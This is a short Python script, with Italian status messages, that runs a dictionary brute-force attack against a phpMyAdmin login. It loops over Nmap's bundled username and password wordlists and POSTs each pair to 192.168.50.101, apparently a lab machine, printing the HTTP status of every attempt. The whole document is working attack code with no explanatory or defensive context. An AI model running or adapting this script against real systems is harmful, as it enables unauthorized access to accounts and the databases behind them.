import http.client, urllib.parse

username_file = open('/usr/share/nmap/nselib/data/usernames.lst')
password_file = open('/usr/share/nmap/nselib/data/passwords.lst')

user_list = username_file.readlines()
pwd_list = password_file.readlines()

user_list = [s.strip() for s in user_list]

pwd_list = [s.strip() for s in pwd_list]
pwd_list = pwd_list[8:]

for user in user_list:
	for pwd in pwd_list:
		print("Tentativo con username", user, "e password", pwd)
		post_parameters = urllib.parse.urlencode({"username": user, "password": pwd, "Submit": "Submit"})
		headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
		conn = http.client.HTTPConnection("192.168.50.101",80)
		conn.request("POST", "/phpMyAdmin", post_parameters, headers)
		response = conn.getresponse()
		print(response.status)

